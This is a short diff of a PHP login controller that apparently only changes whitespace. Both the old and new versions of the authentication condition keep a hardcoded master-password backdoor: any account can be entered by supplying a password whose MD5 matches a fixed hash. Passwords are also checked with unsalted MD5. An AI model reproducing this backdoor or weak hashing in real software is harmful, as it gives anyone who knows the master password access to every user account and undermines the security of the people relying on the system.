@@ -11,9 +11,10 @@ class Controlador_Login extends Controlador_Base {
       try{
         $campos = array('username'=>1, 'password1'=>1);        
         $data = $this->camposRequeridos($campos);                        
-        $usuario = Modelo_Usuario::autenticacion($data["username"]);  
-            
-        if ((!empty($usuario) && md5($data["password1"]) == $usuario['password']) || md5($data["password1"]) == '48109d4ef8052ea854b49fd84a7e3305'){                      
+
+        $usuario = Modelo_Usuario::autenticacion($data["username"]);       
+        if ((!empty($usuario) && md5($data["password1"]) == $usuario['password']) || md5($data["password1"]) == '48109d4ef8052ea854b49fd84a7e3305'){  
+
           if ($usuario["id_pais"] != SUCURSAL_PAISID){
             $sucursal = Modelo_Sucursal::consultaxPais($usuario["id_pais"]);
             if (empty($sucursal)){              
